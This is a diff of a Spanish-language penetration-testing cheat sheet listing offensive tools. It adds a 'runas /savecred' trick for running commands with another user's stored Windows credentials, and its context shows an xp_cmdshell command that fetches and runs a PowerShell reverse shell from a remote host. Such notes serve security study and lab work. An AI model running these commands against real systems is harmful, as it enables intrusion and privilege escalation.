@@ -504,6 +504,7 @@ $ script -qc /bin/bash /dev/null
 - [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Buscar contraseñas por fuerza bruta a tavés de un protocolo o web
 - [**linpeas/winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)**:** Saca info de la máquina para ver como escalar
 - [**Seatbelt**](https://github.com/GhostPack/Seatbelt)**:** Parecido al anterior pero solo con Windows. [Aquí](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) se pueden descargar los .exe ya compilados
+	- Si Seatbelt pilla que una cuenta tiene las credenciales guardadas en el Gestor de Credenciales de Windows podemos ejecutar comandos como dicha cuenta de la siguiente manera: `runas /savecred /user:<usario> /profile "cmd.exe"`
 - [**John the Ripper**](https://github.com/openwall/john)**:** Permite crackear un montón de tipos de contraseñas.
 - **ReverShell desde server SQL:**
 	- Con este comando: `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"` se puede ejecutar
